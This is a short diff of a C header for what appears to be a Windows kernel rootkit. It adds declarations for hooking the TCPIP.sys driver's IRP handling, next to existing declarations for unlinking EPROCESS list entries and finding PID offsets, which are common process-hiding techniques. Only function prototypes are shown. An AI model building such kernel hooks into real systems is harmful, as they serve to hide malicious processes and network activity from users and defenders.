@@ -40,3 +40,19 @@ void remove_links(PLIST_ENTRY Current);
 
 // Return the offset of the PID field in the EPROCESS list
 ULONG find_eprocess_pid_offset();
+
+//------------------------------------------------------------------------------
+//								TCP/IP Hook
+//------------------------------------------------------------------------------
+
+// Hook the TCPIP.sys driver
+NTSTATUS TCPHook();
+
+// Hook handler for hooked TCP/IP driver
+NTSTATUS TCPIRPHookHandler(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp);
+
+// Completion routine
+NTSTATUS HookCompletionRoutine(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp, _In_ PVOID Context);
+
+// Removal function, for driver unload
+NTSTATUS RemoveTCPHook(IN PDRIVER_OBJECT DriverObject);
